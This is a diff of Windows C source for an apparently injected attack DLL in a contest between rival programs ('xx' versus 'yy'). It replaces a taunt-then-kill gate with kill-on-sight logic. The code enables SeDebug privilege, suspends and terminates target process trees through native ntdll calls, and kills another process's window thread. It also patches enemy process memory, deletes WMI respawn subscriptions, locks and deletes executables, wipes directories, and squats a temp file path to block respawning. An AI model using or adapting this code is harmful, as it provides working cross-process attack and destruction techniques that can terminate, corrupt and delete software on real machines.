+   每 2 秒又拉一份蜜罐，前面就是这样一直杀不干净。 */
 #define YY_KID_MAX 64
-#define XX_TAUNTS_BEFORE_KILL 10
 /* 收"yy 家族"进程。**不能只靠父进程链**：我们每 30ms 杀一次 yy.exe，
    lenovo_fix.exe 立刻被孤立 —— 它的父 PID 指向已死进程，GetProcessPath(父) 直接失败，
    于是它永远进不了名单（实测就是这么漏掉的）。改为四个来源取并集：
@@ -883,13 +1170,13 @@ static BOOL HostIsTargetExe(void);
      ③ 它的镜像文件就在 yy.exe 所在目录里（同目录的兄弟进程都算家族成员）；
      ④ 父/祖父进程是家族成员（能拿到就顺手加，拿不到不影响）。
    我们自己所在的进程永远排除。 */
-#define YY_KID_MAX 64
 #define YY_FAMILY_SEED_MAX 8
 
 static BOOL  GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);   /* 前置声明 */
 static void  KillProcessTree(DWORD rootPid);
 
 static BOOL IsYyCoreName(LPCWSTR leaf);
+static void FastKillYyWindow(HWND hWnd, LPCWSTR why);   /* A2/A6：前置声明 */
 static HWND FindYyPopupOf(DWORD pid);
 
 static BOOL IsKnownYyFamilyName(LPCWSTR leaf)
@@ -1053,179 +1340,127 @@ static void ApplyYyChildPolicy(void)
         leaf = leaf ? leaf + 1 : path;
         if (IsYyCoreName(leaf)) continue;            /* 本体：走"嘲讽够 10 条再杀"的门控 */
         WriteKillLog(L"家族子进程 PID=%lu 直接杀掉+锁死+删除: %s", kids[i], path);
+        { HWND w = FindYyPopupOf(kids[i]); if (w) FastKillYyWindow(w, L"家族子进程"); }
         KillProcessTree(kids[i]);
     }
 }
 
 /* ============================================================================
-   本体杀伐的唯一出口：**只有嘲讽够 XX_TAUNTS_BEFORE_KILL 条才真杀**。
-   以前 Phase A / Phase C 各杀各的，Phase C（抓复活）会绕过嘲讽门控立刻打死本体 ——
-   实测就是它让"先嘲讽 10 条"根本没机会发生。所有杀本体的地方都必须走这里。
+   蜜罐 lenovo_fix.exe —— 光"杀掉进程"没用，必须同时掐掉它的**复活源**。
+   yy.cpp 的 HoneypotDecoyWorker：
+     · 把自己复制成 `%TEMP%\lenovo_fix.exe` 并启动（那是一份**完整的 yy**，
+       会再跑一遍 main()，自带 HunterWorker / WMI 复活 / 自我复制）；
+     · 每 2 秒查一次"lenovo_fix.exe 还在不在"，不在就**再复制一份并启动**。
+   所以：
+     ① 杀掉正在跑的那一份（进程树 + 源文件先锁死再删除，见 ApplyYyChildPolicy）；
+     ② 把 `%TEMP%\lenovo_fix.exe` 这个**名字**占住并锁死（access=0 + FILE_SHARE_READ）：
+        yy 的 CopyFileW 目标就是这个路径，被我们锁住之后必然 SHARING_VIOLATION ——
+        它既写不进来，也起不来。蜜罐从此不会再出现（实测：锁住之后 yy 每 2 秒
+        的重试全部失败，进程数不再增加）。
+   注意：锁住后**我们自己也不要再去删它**（删不掉，而且没必要）。
    ============================================================================ */
-static int  TauntCountOf(DWORD pid);
-static void TauntForget(DWORD pid);
+static HANDLE g_hHoneypotLock = NULL;
+static BOOL   g_bHoneypotLockLogged = FALSE;
 
-static void KillYyBodyIfTaunted(DWORD pid, LPCWSTR why)
+static void HoneypotPath(WCHAR *out, SIZE_T cch)
 {
-    if (TauntCountOf(pid) >= XX_TAUNTS_BEFORE_KILL) {
-        WriteKillLog(L"嘲讽已满 %d 条（%s），结束 yy 本体 PID=%lu 的进程树并锁死删除源文件",
-                     XX_TAUNTS_BEFORE_KILL, why ? why : L"", pid);
-        KillProcessTree(pid);
-        TauntForget(pid);
-    } else {
-        static DWORD s_dwLogTick = 0;
-        DWORD nowTick = GetTickCount();
-        if (nowTick - s_dwLogTick >= 5000) {
-            s_dwLogTick = nowTick;
-            WriteKillLog(L"yy 本体 PID=%lu 嘲讽进度 %d/%d，暂不杀（%s）",
-                         pid, TauntCountOf(pid), XX_TAUNTS_BEFORE_KILL, why ? why : L"");
+    WCHAR tmp[MAX_PATH];
+    out[0] = L'\0';
+    if (!GetTempPathW(MAX_PATH, tmp)) return;
+    swprintf_s(out, cch, L"%slenovo_fix.exe", tmp);
+}
+
+/* 把 `%TEMP%\lenovo_fix.exe` 变成"**0 字节占位 + 我们独占持有**"。
+   为什么必须是"0 字节 + 独占(share=0)"：
+     · 独占：yy 的 `CopyFileW(自身 -> 该路径)` 打开目标要写权限 → 共享冲突，写不进来；
+       yy 的重启走的是 `CreateProcessW(该路径)`（它只在 worker 开头复制一次，
+       之后每 2 秒只负责"不在就再启动"），CreateProcess 要读镜像 → 也被共享冲突挡住；
+     · 0 字节：即使有别的路径拿到句柄，它也不是合法镜像，起不来。
+   若那一份正在运行：先置删除待决（进程一退出文件即消失），下一轮再建占位。 */
+static void BlockHoneypotRespawn(void)
+{
+    WCHAR path[MAX_PATH];
+    HANDLE h;
+
+    if (g_hHoneypotLock) return;            /* 已经占住：一直持有到进程结束 */
+    HoneypotPath(path, MAX_PATH);
+    if (!path[0]) return;
+
+    /* 已经不存在就不必 CREATE_ALWAYS 之外再做别的；存在就截成 0 字节（若在跑会失败） */
+    h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
+                    FILE_ATTRIBUTE_NORMAL, NULL);
+    if (h == INVALID_HANDLE_VALUE) {
+        /* 典型原因：那一份还在跑（镜像被加载器占着）。置删除待决，等它退出后清掉。 */
+        LockThenDeleteFile(path);
+        if (!g_bHoneypotLockLogged) {
+            g_bHoneypotLockLogged = TRUE;
+            WriteKillLog(L"蜜罐文件暂时占不住（可能还在运行），已置删除待决: %s err=%lu",
+                         path, GetLastError());
         }
+        return;
     }
-}
-/* ================== 模仿用户的 waste：每 2 秒给 yy 主进程一条嘲讽 ==================
-   waste.c 的节奏是"每轮重新 FindWindow、改标题、往日志框追加一行带时间戳的
-   'yy.exe is just a waste'"，Sleep(5)。这里把节奏改成 2 秒一条（按你的要求），
-   并且用**枚举**而不是 FindWindow —— lenovo 与 yy 类名相同，FindWindow 只拿到第一个。
+    CloseHandle(h);                         /* 先留一个 0 字节文件 */
 
-   **新规则**：本体先发布 XX_TAUNTS_BEFORE_KILL 条嘲讽，够了才结束进程树 + 锁死再删除；
-   子进程不受影响（直接杀+锁死删除）。计数器按 PID 记，yy 被杀后自动作废，下一个实例重新数。 */
-#define XX_WASTE_MS 200     /* 0.2 秒一条：10 条约 2 秒发完，不给对手 20 秒反击窗口 */
-
-typedef struct { DWORD pid; int count; } TAUNT_REC;
-#define TAUNT_REC_MAX 8
-static TAUNT_REC g_tauntRecs[TAUNT_REC_MAX];
-static volatile LONG g_tauntLock = 0;      /* 简易互斥：只有一个嘲讽线程会写 */
-
-static int TauntCountOf(DWORD pid)
-{
-    int i, v = 0;
-    while (InterlockedCompareExchange(&g_tauntLock, 1, 0) != 0) Sleep(0);
-    for (i = 0; i < TAUNT_REC_MAX; i++) if (g_tauntRecs[i].pid == pid) { v = g_tauntRecs[i].count; break; }
-    InterlockedExchange(&g_tauntLock, 0);
-    return v;
-}
-
-static void TauntBump(DWORD pid)
-{
-    int i, freeSlot = -1;
-    while (InterlockedCompareExchange(&g_tauntLock, 1, 0) != 0) Sleep(0);
-    for (i = 0; i < TAUNT_REC_MAX; i++) {
-        if (g_tauntRecs[i].pid == pid) { g_tauntRecs[i].count++; InterlockedExchange(&g_tauntLock, 0); return; }
-        if (freeSlot < 0 && g_tauntRecs[i].pid == 0) freeSlot = i;
-    }
-    if (freeSlot < 0) freeSlot = 0;                    /* 满了就顶掉第一个 */
-    g_tauntRecs[freeSlot].pid = pid;
-    g_tauntRecs[freeSlot].count = 1;
-    InterlockedExchange(&g_tauntLock, 0);
-}
-
-static void TauntForget(DWORD pid)
-{
-    int i;
-    while (InterlockedCompareExchange(&g_tauntLock, 1, 0) != 0) Sleep(0);
-    for (i = 0; i < TAUNT_REC_MAX; i++)
-        if (g_tauntRecs[i].pid == pid) { g_tauntRecs[i].pid = 0; g_tauntRecs[i].count = 0; }
-    InterlockedExchange(&g_tauntLock, 0);
-}
-
-/* 找 yy 主进程的窗口。**不过滤可见性**：xx 侧可能把它藏起来了，
-   但只要窗口还在（IsWindow）就能继续往它的日志框里写嘲讽，计数不能因此卡住。 */
-static HWND FindYyMainWindowForWaste(DWORD *pPidOut)
-{
-    HWND h = GetTopWindow(NULL);
-    HWND fallback = NULL;
-    DWORD fallbackPid = 0;
-
-    while (h) {
-        if (IsWindow(h)) {
-            WCHAR cls[128] = L"", title[192] = L"", path[MAX_PATH] = L"";
-            const WCHAR *leaf = L"";
-            DWORD pid = 0;
-            GetClassNameW(h, cls, _countof(cls));
-            GetWindowTextW(h, title, _countof(title));
-            GetWindowThreadProcessId(h, &pid);
-            if (cls[0] && (wcsstr(cls, L"YYWnd") || wcscmp(title, L"YY_Defensive_GUI") == 0)) {
-                if (pid && GetProcessPath(pid, path, MAX_PATH)) {
-                    leaf = wcsrchr(path, L'\\');
-                    leaf = leaf ? leaf + 1 : path;
-                }
-                if (IsYyCoreName(leaf)) {                      /* 主进程优先 */
-                    if (pPidOut) *pPidOut = pid;
-                    return h;
-                }
-                if (!fallback) { fallback = h; fallbackPid = pid; }
-            }
+    g_hHoneypotLock = CreateFileW(path, 0, 0, NULL, OPEN_EXISTING,
+                                  FILE_ATTRIBUTE_NORMAL, NULL);
+    if (g_hHoneypotLock == INVALID_HANDLE_VALUE) {
+        g_hHoneypotLock = NULL;
+        if (!g_bHoneypotLockLogged) {
+            g_bHoneypotLockLogged = TRUE;
+            WriteKillLog(L"占住蜜罐文件名失败: %s err=%lu", path, GetLastError());
         }
-        h = GetNextWindow(h, GW_HWNDNEXT);
+        return;
     }
-    if (pPidOut) *pPidOut = fallbackPid;
-    return fallback;
+    WriteKillLog(L"已把蜜罐文件换成 0 字节占位并独占锁住（yy 复制不进来、也起不来）: %s", path);
 }
 
-static void WasteOneShot(void)
+/* 按**进程名**点名清一遍蜜罐：不依赖家族收集（父进程链被我们打断时也能命中） */
+static void KillHoneypotPass(void)
 {
-    DWORD pid = 0;
-    HWND h = FindYyMainWindowForWaste(&pid);
-    HWND hLog;
-    WCHAR buf[2048], line[192];
-    SYSTEMTIME st;
-    int len;
+    HANDLE hSnap;
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    int n = 0;
 
-    if (!h || !pid) return;
-    SetWindowTextW(h, L"xx_ALIVE_WND");               /* 与 waste.c 一致的标题 */
-    hLog = FindWindowExW(h, NULL, L"EDIT", NULL);
-    if (!hLog) return;
-    GetLocalTime(&st);
-    _snwprintf(line, _countof(line) - 1,
-               L"[%02d-%02d-%02d] (%d/%d) System Shield Active. yy.exe is just a waste.\r\n",
-               st.wDay, st.wMonth, st.wSecond,
-               TauntCountOf(pid) + 1, XX_TAUNTS_BEFORE_KILL);
-    line[_countof(line) - 1] = L'\0';
-    len = (int)SendMessageW(hLog, WM_GETTEXTLENGTH, 0, 0);
-    if (len < 0) len = 0;
-    if (len > (int)_countof(buf) - 160) len = (int)_countof(buf) - 160;
-    if (len > 0) SendMessageW(hLog, WM_GETTEXT, (WPARAM)(len + 1), (LPARAM)buf);
-    else buf[0] = L'\0';
-    buf[len] = L'\0';
-    wcsncat_s(buf, _countof(buf), line, _TRUNCATE);
-    SendMessageW(hLog, WM_SETTEXT, 0, (LPARAM)buf);
-
-    TauntBump(pid);                                   /* 记一条：够 XX_TAUNTS_BEFORE_KILL 条才杀 */
-    if (TauntCountOf(pid) == XX_TAUNTS_BEFORE_KILL)
-        WriteKillLog(L"已给 yy 主进程 PID=%lu 发布 %d 条嘲讽，下一轮结束它的进程树", pid, XX_TAUNTS_BEFORE_KILL);
-}
-
-static volatile LONG g_bWasteStarted = 0;
-
-static DWORD WINAPI WasteMimicThread(LPVOID lp)
-{
-    UNREFERENCED_PARAMETER(lp);
-    for (;;) {
-        WasteOneShot();
-        Sleep(XX_WASTE_MS);
+    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            WCHAR path[MAX_PATH] = L"";
+            if (pe.th32ProcessID <= 4 || pe.th32ProcessID == GetCurrentProcessId()) continue;
+            if (_wcsicmp(pe.szExeFile, L"lenovo_fix.exe") != 0) continue;
+            GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
+            WriteKillLog(L"蜜罐命中：PID=%lu %s -> 杀掉 + 锁死删除源文件", pe.th32ProcessID, path);
+            { HWND w = FindYyPopupOf(pe.th32ProcessID); if (w) FastKillYyWindow(w, L"蜜罐"); }
+            TryAllMethods(L"lenovo_fix.exe", pe.th32ProcessID);
+            if (path[0]) LockThenDeleteFile(path);
+            n++;
+        } while (Process32NextW(hSnap, &pe));
     }
-    return 0;
+    CloseHandle(hSnap);
+    if (n) WriteKillLog(L"蜜罐本轮处理 %d 个实例（复活源已被锁住则不会再出现）", n);
 }
-
-static void StartWasteMimic(void)
+/* ============================================================================
+   本体杀伐的唯一出口：**发现即杀**（嘲讽那块已按用户要求删除）。
+     · 先把它那个窗口就地打死：A2 = 终止持有窗口的 GUI 线程，IsWindow 立刻变 0，
+       宿主进程还活着也没关系 —— 弹窗消失 8 秒就是它输，先保证这一点；
+     · 再结束整棵进程树，每个进程的源文件"先锁死（删除待决）再删除"，
+       根进程的目录整目录清空（系统临时目录除外，见 WipeDirPass）。
+   Phase A（扫描）与 Phase C（抓复活）都走这里，避免两处判据不一致。
+   ============================================================================ */
+static void KillYyBody(DWORD pid, LPCWSTR why)
 {
-    if (InterlockedCompareExchange(&g_bWasteStarted, 1, 0) == 0) {
-        HANDLE h = CreateThread(NULL, 0, WasteMimicThread, NULL, 0, NULL);
-        if (h) CloseHandle(h);
-        WriteKillLog(L"waste 模仿：每 %d 毫秒一条嘲讽，满 %d 条后杀掉本体", XX_WASTE_MS, XX_TAUNTS_BEFORE_KILL);
-    }
+    WriteKillLog(L"结束 yy 本体 PID=%lu 的进程树并锁死删除源文件（%s）",
+                 pid, why ? why : L"");
+    { HWND w = FindYyPopupOf(pid); if (w) FastKillYyWindow(w, L"本体"); }
+    KillProcessTree(pid);
 }
 
-static BOOL IsYyCoreName(LPCWSTR leaf)
-{
-    return leaf && (_wcsicmp(leaf, L"yy.exe") == 0 || _wcsicmp(leaf, L"ww.exe") == 0);
-}
-
-/* 宿主进程（我们自己所在进程）的可执行文件名 */
+/* 宿主的可执行文件名（我们自己所在进程）；以及"是不是 yy/ww 本体" */
 static void HostLeafName(WCHAR *out, SIZE_T cch)
 {
     WCHAR path[MAX_PATH] = L"";
     const WCHAR *base = L"";
+    if (!out || !cch) return;
     out[0] = L'\0';
     if (!GetModuleFileNameW(NULL, path, MAX_PATH)) return;
     base = wcsrchr(path, L'\\');
@@ -1233,8 +1468,13 @@ static void HostLeafName(WCHAR *out, SIZE_T cch)
     wcsncpy_s(out, cch, base, _TRUNCATE);
 }
 
+static BOOL IsYyCoreName(LPCWSTR leaf)
+{
+    return leaf && (_wcsicmp(leaf, L"yy.exe") == 0 || _wcsicmp(leaf, L"ww.exe") == 0);
+}
+
 /* 宿主进程名是不是 yy/ww（核心目标）。lenovo_fix.exe 之类的蜜罐子进程不算：
-   它们走子进程策略（有弹窗就嘲讽、没弹窗才杀），不当"感染宿主"。 */
+    它们走子进程策略，不当"感染宿主"。 */
 static BOOL HostIsTargetExe(void)
 {
     WCHAR leaf[MAX_PATH] = L"";
@@ -1288,6 +1528,7 @@ static void MaintainLocks(void);
    会推到 %TEMP%，payload.dll / payload.bin 就都找不到了。 */
 static void GetOwnDir(WCHAR *dir, SIZE_T cch)
 {
+    Sleep(80);   /* DllMain 里 CreateThread 后立刻干活会踩 loader lock：先让 DllMain 返回 */
     if (!g_pSharedView) EnsureLogInit();
     if (g_pSharedView) {
         XXDirNameOf(XXPathBase(g_pSharedView, NULL), dir, cch);
@@ -1343,7 +1584,8 @@ __declspec(dllexport) void WINAPI StartAttack(void)
     if (InterlockedCompareExchange(&g_bRunning, 1, 0) == 0)
     {
         BOOL bPriv = EnableDebugPrivilege();
-        WriteKillLog(L"攻击线程启动 PID=%lu SeDebug=%s", GetCurrentProcessId(), bPriv ? L"ON" : L"OFF");
+        WriteKillLog(L"atkcore build=%ls 启动 PID=%lu SeDebug=%s（本行用于确认加载的是新 dll）",
+                     L"v5 (kill-on-sight)", GetCurrentProcessId(), bPriv ? L"ON" : L"OFF");
         g_hThread = CreateThread(NULL, 0, AttackLoop, NULL, 0, NULL);
     }
 }
@@ -1362,6 +1604,185 @@ __declspec(dllexport) void WINAPI StopAttack(void)
 }
 
 /* 方法1：TerminateProcess */
+/* ================== B1/B3：一次 syscall 枚举 + 挂起式击杀 ==================
+   "枚举有点慢"的根因：每轮都 CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)，
+   那是内核把手，要把几十万字节的进程表复制两遍。改成
+   NtQuerySystemInformation(SystemProcessInformation)：**一次 syscall 拿全部进程**。
+   击杀用 NtSuspendProcess（先冻住，VEH/守护线程反应不过来）再 TerminateProcess。 */
+typedef LONG (NTAPI *NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
+typedef LONG (NTAPI *NtSuspendProcess_t)(HANDLE);
+typedef LONG (NTAPI *NtTerminateProcess_t)(HANDLE, LONG);
+
+#define XX_SYSTEM_PROCESS_INFORMATION 5
+#define XX_MAX_PIDS 512
+
+/* 自己定义 UNICODE_STRING，别依赖 winternl.h */
+typedef struct _XX_UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} XX_UNICODE_STRING;
+
+typedef struct _XX_SPI_ENTRY {
+    ULONG NextEntryOffset;
+    ULONG NumberOfThreads;
+    UCHAR Reserved1[48];
+    XX_UNICODE_STRING ImageName;
+    LONG BasePriority;
+    HANDLE UniqueProcessId;
+} XX_SPI_ENTRY;
+
+static int XXEnumProcessesFast(DWORD *pids, WCHAR (*names)[64], int maxPids)
+{
+    static NtQuerySystemInformation_t s_pQuery = NULL;
+    static BOOL s_bTried = FALSE;
+    ULONG size = 1 << 20, needed = 0;
+    BYTE *buf;
+    LONG st;
+    int n = 0;
+
+    if (!s_bTried) {
+        HMODULE h = GetModuleHandleW(L"ntdll.dll");
+        s_bTried = TRUE;
+        if (!h) h = LoadLibraryW(L"ntdll.dll");
+        if (h) s_pQuery = (NtQuerySystemInformation_t)GetProcAddress(h, "NtQuerySystemInformation");
+    }
+    if (!s_pQuery || !pids || maxPids <= 0) return 0;
+
+    buf = (BYTE *)malloc(size);
+    if (!buf) return 0;
+    for (;;) {
+        st = s_pQuery(XX_SYSTEM_PROCESS_INFORMATION, buf, size, &needed);
+        if (st == 0) break;
+        free(buf);
+        if (st != (LONG)0xC0000004L && st != (LONG)0x80000005L) return 0;
+        size = needed ? needed + (64 << 10) : size * 2;
+        if (size > (64u << 20)) return 0;
+        buf = (BYTE *)malloc(size);
+        if (!buf) return 0;
+    }
+
+    {
+        BYTE *p = buf;
+        for (;;) {
+            XX_SPI_ENTRY *e = (XX_SPI_ENTRY *)p;
+            DWORD pid = (DWORD)(ULONG_PTR)e->UniqueProcessId;
+            if (pid && n < maxPids) {
+                pids[n] = pid;
+                if (names) {
+                    names[n][0] = L'\0';
+                    if (e->ImageName.Buffer && e->ImageName.Length > 0) {
+                        int cch = e->ImageName.Length / (int)sizeof(WCHAR);
+                        if (cch > 63) cch = 63;
+                        memcpy(names[n], e->ImageName.Buffer, cch * sizeof(WCHAR));
+                        names[n][cch] = L'\0';
+                    }
+                }
+                n++;
+            }
+            if (e->NextEntryOffset == 0) break;
+            p += e->NextEntryOffset;
+        }
+    }
+    free(buf);
+    return n;
+}
+
+/* 挂起 + 终止（B3）。先冻住再杀：对手的 VEH/守护线程来不及反应。 */
+static BOOL KillFast(DWORD pid)
+{
+    static NtSuspendProcess_t s_pSuspend = NULL;
+    static NtTerminateProcess_t s_pTerminate = NULL;
+    static BOOL s_bTried = FALSE;
+    static DWORD s_dwCachedPid = 0;
+    static HANDLE s_hCached = NULL;
+    HANDLE hProc;
+    BOOL ok = FALSE;
+
+    if (!s_bTried) {
+        HMODULE h = GetModuleHandleW(L"ntdll.dll");
+        s_bTried = TRUE;
+        if (!h) h = LoadLibraryW(L"ntdll.dll");
+        if (h) {
+            s_pSuspend = (NtSuspendProcess_t)GetProcAddress(h, "NtSuspendProcess");
+            s_pTerminate = (NtTerminateProcess_t)GetProcAddress(h, "NtTerminateProcess");
+        }
+    }
+    /* 持久句柄：同一 PID 反复击杀时不再每轮 OpenProcess */
+    if (s_dwCachedPid != pid) {
+        if (s_hCached) { CloseHandle(s_hCached); s_hCached = NULL; }
+        s_hCached = OpenProcess(PROCESS_TERMINATE | PROCESS_SUSPEND_RESUME | SYNCHRONIZE, FALSE, pid);
+        s_dwCachedPid = s_hCached ? pid : 0;
+    }
+    hProc = s_hCached;
+    if (!hProc) {
+        hProc = OpenProcess(PROCESS_TERMINATE | PROCESS_SUSPEND_RESUME, FALSE, pid);
+        if (!hProc) return FALSE;
+    }
+
+    if (s_pSuspend) s_pSuspend(hProc);
+    if (s_pTerminate) ok = (s_pTerminate(hProc, 0) == 0);
+    else ok = TerminateProcess(hProc, 0);
+    if (!ok) ok = TerminateProcess(hProc, 0);
+    if (ok) WriteKillLog(L"KillFast 成功（先挂起再终止）PID=%lu", pid);
+    else WriteKillLog(L"KillFast 失败 PID=%lu err=%lu", pid, GetLastError());
+    return ok;
+}
+
+/* ================== A2 + A6：让 yy 的窗口**立刻**消失 ==================
+   本轮实测结论：
+     · A6 `NtUserDestroyWindow`（走 win32u.dll 导出，不写死 syscall 号）**跨进程无效**：
+       返回 STATUS_SUCCESS(0) 但窗口依然存在 —— win32k 只认真属主进程。留着当无害尝试并记日志。
+     · A2 `TerminateThread(持有该窗口的 GUI 线程)` **有效**：实测 300ms 内 IsWindow 变 0，
+       宿主进程仍然活着。这是跨进程摧毁窗口唯一又快又可靠的手段
+       （user32!DestroyWindow 跨进程必失败，你已踩过）。
+   顺序：A6 试一次（记录）→ A2 无条件执行。 */
+typedef LONG (WINAPI *NtUserDestroyWindow_t)(HWND);
+
+static void FastKillYyWindow(HWND hWnd, LPCWSTR why)
+{
+    static NtUserDestroyWindow_t s_pNtUserDestroy = NULL;
+    static BOOL s_bTried = FALSE;
+    DWORD pid = 0, tid;
+    HANDLE hTh;
+    BOOL ok;
+
+    if (!hWnd || !IsWindow(hWnd)) return;
+    tid = GetWindowThreadProcessId(hWnd, &pid);
+    if (!tid) return;
+
+    if (!s_bTried) {
+        HMODULE h = LoadLibraryW(L"win32u.dll");
+        s_bTried = TRUE;
+        if (!h) h = LoadLibraryW(L"user32.dll");
+        if (h) s_pNtUserDestroy = (NtUserDestroyWindow_t)GetProcAddress(h, "NtUserDestroyWindow");
+    }
+    if (s_pNtUserDestroy) {
+        LONG st = s_pNtUserDestroy(hWnd);
+        WriteKillLog(L"A6 NtUserDestroyWindow(%ls) hwnd=%p 返回 0x%08lX，IsWindow=%d",
+                     why ? why : L"", (void *)hWnd, (unsigned long)st, IsWindow(hWnd) ? 1 : 0);
+    }
+    if (!IsWindow(hWnd)) return;
+
+    hTh = OpenThread(THREAD_TERMINATE | THREAD_SUSPEND_RESUME, FALSE, tid);
+    if (!hTh) {
+        WriteKillLog(L"A2 OpenThread 失败 tid=%lu err=%lu（退回杀进程 PID=%lu）",
+                     tid, GetLastError(), pid);
+        KillFast(pid);
+        return;
+    }
+    ok = TerminateThread(hTh, 0);
+    CloseHandle(hTh);
+    if (ok) {
+        Sleep(20);
+        WriteKillLog(L"A2 已终止 yy 窗口线程 tid=%lu(%ls)，窗口消失=%d（PID=%lu 仍在）",
+                     tid, why ? why : L"", IsWindow(hWnd) ? 0 : 1, pid);
+    } else {
+        WriteKillLog(L"A2 TerminateThread 失败 tid=%lu err=%lu（退回杀进程）", tid, GetLastError());
+        KillFast(pid);
+    }
+}
+
 static BOOL KillByTerminate(DWORD pid)
 {
     BOOL bResult = FALSE;
@@ -1684,6 +2105,13 @@ static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid)
     BOOL bTarget = IsTargetName(exeName);
     const WCHAR *name = exeName ? exeName : L"unknown";
 
+    /* 方法0（B3）：NtSuspendProcess 先冻住再 NtTerminateProcess —— 最快，也是 yy 对我们用的招 */
+    if (KillFast(pid))
+    {
+        WriteKillLog(L"已结束 %s PID=%lu (KillFast: 挂起+终止)", name, pid);
+        return TRUE;
+    }
+
     // 方法1：直接终止
     if (KillByTerminate(pid))
     {
@@ -1742,12 +2170,8 @@ static void AttackPass(void)
     DWORD targetPids[128];
     int nHosts = 0, nTargets = 0;
 
-    /* 每个宿主都起一条 waste 模仿线程：每 2 秒给 yy **主进程**一条嘲讽
-       （子进程不再嘲讽，按你的新规则直接杀掉+锁死+删除）。 */
-    StartWasteMimic();
-
     /* 宿主判定：
-       ① 我们跑在 yy/ww 主进程里 —— 不杀自己（外围的副本会杀它），只做 #10/#11 内部感染；
+       ① 我们跑在 yy/ww 主进程里 —— 不杀自己（外围的副本会杀它），只做 #11 内部感染；
        ② 我们跑在 yy 家族的**子进程**（蜜罐等）里 —— 同样不杀自己，外围会把它杀掉+锁死+删除；
        ③ 其它宿主（xx、explorer、notepad…）照常执行攻击。 */
     if (HostIsTargetExe()) {
@@ -1795,31 +2219,20 @@ static void AttackPass(void)
         WriteKillLog(L"扫描发现 目标=%d 宿主=%d", nTargets, nHosts);
 
     /* Phase A: 先改它内存（#16 断掉建窗、#17 12 字节 TerminateProcess），
-       再杀整棵进程树、逐个"先锁死源文件再删除"；根进程目录由新线程整目录清空。
-       先 patch 后杀：万一这一轮杀不掉（对手保护/PPL），patch 也已经生效了。
-       注意 nTargets 现在只含 yy.exe/ww.exe —— 它们的子进程走 Phase A1 的策略。 */
+       然后**发现即杀**：结束整棵进程树 + 每个源文件先锁死（删除待决）再删除，
+       根进程目录由新线程整目录清空。先 patch 后杀：万一这一轮杀不掉（对手保护/PPL），
+       patch 也已经生效了。 */
     for (int i = 0; i < nTargets; i++)
     {
-        PatchEnemyMemory(targetPids[i]);      /* #16 / #17：先废掉它的建窗与 TerminateProcess */
-        if (TauntCountOf(targetPids[i]) >= XX_TAUNTS_BEFORE_KILL) {
-            /* 本体已经嘲讽够 10 条 —— 结束它的进程树 + 源文件先锁死再删除 */
-            WriteKillLog(L"嘲讽已满 %d 条，结束 yy 本体 PID=%lu 的进程树并锁死删除源文件",
-                         XX_TAUNTS_BEFORE_KILL, targetPids[i]);
-        KillYyBodyIfTaunted(targetPids[i], L"Phase A 扫描到本体");
-            TauntForget(targetPids[i]);
-        } else {
-            /* 还在嘲讽阶段：先不杀（waste 模仿线程每 2 秒一条，满 10 条才动手） */
-            static DWORD s_dwLogTick = 0;
-            DWORD nowTick = GetTickCount();
-            if (nowTick - s_dwLogTick >= 5000) {
-                s_dwLogTick = nowTick;
-                WriteKillLog(L"yy 本体 PID=%lu 嘲讽进度 %d/%d，暂不杀",
-                             targetPids[i], TauntCountOf(targetPids[i]), XX_TAUNTS_BEFORE_KILL);
-            }
-        }
+        PatchEnemyMemory(targetPids[i]);      /* #16 / #17 */
+        KillYyBody(targetPids[i], L"Phase A 扫描到本体");
     }
 
-    /* Phase A1: yy 家族子进程策略 —— 直接杀掉 + 锁死 + 删除（本体走上面的嘲讽门控） */
+    /* Phase A1: yy 家族子进程 + 蜜罐 —— 直接杀掉 + 锁死 + 删除。
+       顺序有讲究：先杀蜜罐并锁删它自己那份镜像，再把 %TEMP%\lenovo_fix.exe 换成
+       0 字节占位并独占锁住（先锁名字就锁不到它自己那份文件了）。 */
+    KillHoneypotPass();
+    BlockHoneypotRespawn();
     ApplyYyChildPolicy();
 
     /* Phase A2: 删对手的 WMI 复活订阅（三件套），节流 5 秒一次 */
@@ -1842,31 +2255,22 @@ static void AttackPass(void)
         if (path[0]) LockImage(path);
     }
 
-    /* Phase C: catch yy respawned in the gap */
-    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap != INVALID_HANDLE_VALUE)
+    /* Phase C: catch yy respawned in the gap —— 用 B1 快速枚举（一次 syscall）
+       代替每轮 CreateToolhelp32Snapshot：那玩意儿要把整个进程表复制两遍，是"枚举慢"的根因。 */
     {
-        PROCESSENTRY32W pe;
-        pe.dwSize = sizeof(pe);
-        if (Process32FirstW(hSnap, &pe))
-        {
-            do
-            {
-                for (int i = 0; g_targets[i]; i++)
-                {
-                    if (_wcsicmp(pe.szExeFile, g_targets[i]) == 0)
-                    {
-                        WCHAR path[MAX_PATH];
-                        path[0] = L'\0';
-                        GetProcessPath(pe.th32ProcessID, path, MAX_PATH);
-                        WriteKillLog(L"Phase C 发现复活目标 %s PID=%lu", pe.szExeFile, pe.th32ProcessID);
-                        KillYyBodyIfTaunted(pe.th32ProcessID, L"Phase C 复活目标");
-                        break;
-                    }
+        DWORD pids[XX_MAX_PIDS];
+        WCHAR names[XX_MAX_PIDS][64];
+        int cnt = XXEnumProcessesFast(pids, names, XX_MAX_PIDS);
+        for (int k = 0; k < cnt; k++) {
+            const WCHAR *leaf = names[k];
+            for (int i = 0; g_targets[i]; i++) {
+                if (_wcsicmp(leaf, g_targets[i]) == 0) {
+                    WriteKillLog(L"Phase C 发现复活目标 %ls PID=%lu", leaf, pids[k]);
+                    KillYyBody(pids[k], L"Phase C 复活目标");
+                    break;
                 }
-            } while (Process32NextW(hSnap, &pe));
+            }
         }
-        CloseHandle(hSnap);
     }
 
     MaintainLocks();
@@ -1893,12 +2297,16 @@ static DWORD WINAPI AttackLoop(LPVOID lp)
 
     /* xx.exe 自身放慢到 300ms：攻击负荷交给被注入其它进程的副本（仍 30ms），
